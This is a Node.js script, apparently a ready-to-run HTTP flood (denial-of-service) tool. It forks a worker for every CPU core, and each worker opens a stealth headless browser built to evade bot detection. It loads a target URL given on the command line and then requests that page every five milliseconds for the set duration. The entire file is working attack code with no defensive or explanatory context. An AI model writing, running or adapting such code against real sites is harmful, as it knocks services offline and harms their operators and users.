const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const cluster = require('cluster');
puppeteer.use(StealthPlugin());

const target = process.argv[2], duration = parseInt(process.argv[3]);

if (cluster.isMaster) {
    for (let i = 0; i < require('os').cpus().length; i++) cluster.fork();
    setTimeout(() => { process.exit(); }, duration * 1000);
} else {
    async function attack() {
        const browser = await puppeteer.launch({ headless: "new", args: ['--no-sandbox', '--disable-setuid-sandbox'] });
        const page = await browser.newPage();
        await page.setRequestInterception(true);
        page.on('request', (req) => {
            if (['image', 'font', 'media'].includes(req.resourceType())) req.abort();
            else req.continue();
        });
        try {
            await page.goto(target, { waitUntil: 'domcontentloaded' });
            await page.evaluate(() => {
                setInterval(() => { fetch(window.location.href).catch(() => {}); }, 5);
            });
        } catch (e) { await page.close(); }
    }
    attack();
}

